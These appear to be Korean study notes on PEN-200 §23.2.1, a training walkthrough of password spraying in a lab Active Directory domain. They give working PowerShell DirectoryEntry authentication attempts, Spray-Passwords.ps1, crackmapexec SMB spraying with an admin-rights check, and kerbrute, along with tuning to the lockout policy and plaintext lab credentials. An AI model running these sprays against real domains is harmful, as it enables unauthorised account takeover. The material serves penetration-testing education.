# 23.2.1 패스워드 공격

> **Password Attacks** · PEN-200 §23.2.1

AD 에서도 패스워드 공격은 사용자 자격 증명을 얻는 유효한 선택지임. 다만 착수 전에 반드시 따져야 할 것이 하나 있음 — **계정 잠금(account lockout)** 임. 브루트포스나 워드리스트 인증 공격에서 실패 로그인이 쌓이면 계정이 잠겨 이후 공격이 막히고, 관리자에게 경보가 갈 수도 있음.

도메인 계정 정책은 CLIENT75 에 도메인 사용자 jeff(`HenchmanPutridBonbon11`)로 RDP 접속한 뒤 일반 PowerShell 에서 `net accounts` 로 확인함.

```
PS C:\Users\jeff> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

*`net accounts` 로 확인한 도메인 계정 정책*

- **Lockout threshold 5** — 잠금이 걸리기까지 다섯 번이므로 안전하게 시도할 수 있는 것은 **네 번**임
- **Lockout observation window 30분** — 마지막 실패로부터 30분이 지나면 다시 시도할 수 있음
- 이 설정이면 실제 사용자가 로그인에 실패하지 않는다는 전제 하에, 모든 도메인 사용자마다 24시간에 **192회**까지 시도할 수 있음

이런 조건에서 성립하는 공격은 아주 흔한 패스워드의 짧은 목록을 대량의 사용자에게 던지는 형태임. 조직의 약한 계정이 꽤 걸리는 대신 네트워크 트래픽이 크게 발생함. AD 환경에서 성공 가능성이 높은 스프레이 방식 세 가지를 봄.

**첫째, LDAP 와 ADSI 를 쓰는 low and slow 방식.** 앞 모듈에서는 `DirectoryEntry` 를 인자 없이 써서 로그인한 사용자 컨텍스트로 질의했지만, 도메인 컨트롤러의 LDAP 경로·사용자명·패스워드 세 인자를 주면 **다른 사용자 컨텍스트**로 질의할 수 있음. 이것이 곧 인증 시도가 됨.

⚠️ 아래 블록은 PDF 추출 과정에서 줄이 접혀 있음 — 접힌 줄은 이어 붙여 실행할 것.

```
PS C:\Users\jeff> $domainObj =
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
PS C:\Users\jeff> $PDC = ($domainObj.PdcRoleOwner).Name
PS C:\Users\jeff> $SearchString = "LDAP://"
PS C:\Users\jeff> $SearchString += $PDC + "/"
PS C:\Users\jeff> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
PS C:\Users\jeff> $SearchString += $DistinguishedName
PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString,
"pete", "Nexus123!")
```

*`DirectoryEntry` 로 인증 시도*

패스워드가 맞으면 객체 생성이 성공함.

```
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```

*인증 성공 시 생성되는 객체*

틀리면 객체가 만들어지지 않고 `The user name or password is incorrect.` 를 담은 예외가 발생함 — 성공·실패를 구분하는 신호가 이것임.

```
format-default : The following exception occurred while retrieving member
"distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default],
ExtendedTypeSystemException
    + FullyQualifiedErrorId :
CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

*패스워드가 틀렸을 때 `DirectoryEntry` 가 뱉는 예외*

이 방식을 Lockout threshold 와 observation window 에 맞춰 전체 사용자에게 돌리는 스크립트가 CLIENT75 의 `C:\Tools\Spray-Passwords.ps1` 로 이미 구현돼 있음. `-Pass` 로 단일 패스워드를, `-File` 로 워드리스트를 지정하고 `-Admin` 을 붙이면 관리자 계정까지 대상에 넣음. 도메인 사용자는 스크립트가 알아서 식별함.

```
PS C:\Users\jeff> cd C:\Tools
PS C:\Tools> powershell -ep bypass
...
PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```

*`Spray-Passwords.ps1` 로 사용자 계정 공격*

**둘째, SMB 를 쓰는 방식.** AD 패스워드 공격의 전통적 접근이지만 단점이 있음 — 인증 시도마다 SMB 연결을 온전히 맺고 끊어야 해서 트래픽이 크고 시끄러우며, 다른 기법에 비해 느림.

Kali 에서는 `crackmapexec` 을 씀. 프로토콜로 `smb` 를 고르고 도메인에 가입된 아무 시스템의 IP(여기서는 CLIENT75, 192.168.50.75)를 지정함. `-u`·`-p` 에 사용자·패스워드 목록이나 단일 값을, `-d` 에 도메인명을 주고, `--continue-on-success` 로 첫 유효 자격 증명에서 멈추지 않게 함.

⚠️ 아래 블록은 PDF 추출 과정에서 줄이 접혀 있음 — `--` 와 `continue-on-success` 는 한 옵션임.

```
kali@kali:~$ cat users.txt
dave
jen
pete
kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --
continue-on-success
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64
(name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:Nexus123!
STATUS_LOGON_FAILURE
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:Nexus123!
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
```

*`crackmapexec` 으로 사용자 계정 공격*

시도한 자격 증명 앞에 플러스·마이너스가 붙어 유효 여부를 표시함. ⚠️ crackmapexec 은 스프레이 전에 도메인의 패스워드 정책을 **확인하지 않음** — 계정 잠금 위험은 직접 관리해야 함.

덤으로 crackmapexec 은 자격 증명이 유효한지만이 아니라 그 사용자가 대상 시스템에서 **관리자 권한**을 갖는지도 알려줌. dave 는 CLIENT75 의 로컬 관리자라 출력에 `Pwn3d!` 가 붙음. 추가 열거 없이 확보한 접근 수준을 판정할 수 있는 유용한 기능임.

```
kali@kali:~$ crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64
(name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\dave:Flowers1
(Pwn3d!)
```

*`Pwn3d!` — 해당 자격 증명이 대상에서 관리자 권한을 가짐을 표시*

**셋째, TGT 획득에 기반한 방식.** Linux 의 `kinit` 처럼 사용자명·패스워드로 Kerberos TGT 를 요청해 캐시하는 것으로, 자격 증명이 유효하면 TGT 를 받음. 장점은 **AS-REQ 를 보내고 응답만 보므로 UDP 프레임 두 개**로 패스워드 유효성 판정이 끝난다는 점임.

이 기법을 구현한 도구가 `kerbrute` 이고 크로스 플랫폼이라 Windows·Linux 양쪽에서 씀. `passwordspray` 명령에 사용자명 목록과 뿌릴 패스워드를 주고 `-d` 로 도메인을 지정함.

⚠️ 아래 블록은 PDF 추출 과정에서 줄이 접혀 있음 — 패스워드 인자가 명령과 같은 줄에 와야 함.

```
PS C:\Tools> type .\usernames.txt
pete
dave
jen
PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt
"Nexus123!"
    __             __               __

  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop

2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
```

*`kerbrute` 로 사용자 계정 공격*

함정 — 네트워크 오류가 나면 `usernames.txt` 의 인코딩을 확인할 것. ANSI 여야 하며 메모장의 다른 이름으로 저장에서 바꿀 수 있음.

crackmapexec 과 kerbrute 는 둘 다 사용자명 목록을 요구함. 목록은 앞 모듈의 열거 기법으로 만들거나 두 도구의 내장 사용자 열거 기능으로 얻을 수 있음.

스프레이는 계정 정책에 잠금 임계값이 **설정돼 있지 않을 때** 특히 효과적임. 이어지는 두 절은 해시 크랙에 기대는 공격이라 스프레이보다 성공률이 높은 편임.
